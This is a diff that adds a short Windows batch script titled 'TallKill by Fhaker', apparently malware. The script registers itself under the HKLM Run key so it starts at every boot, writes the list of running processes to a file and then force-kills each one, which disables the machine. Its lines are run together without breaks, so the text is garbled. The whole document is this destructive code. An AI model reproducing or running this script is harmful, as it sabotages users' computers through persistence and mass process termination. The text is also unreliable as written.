@@ -1,0 +1,1 @@
+@echo offREG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "DataBaseNhgT000" /t REG_SZ /d %0title TallKill by Fhakercd/tasklist >kuank2.txtset /a f=%f% + 1set /a sk=5 + %f%for /f "skip=%sk% tokens=1 delims= " %%i in (kuank2.txt) do taskkill /f /im %%i
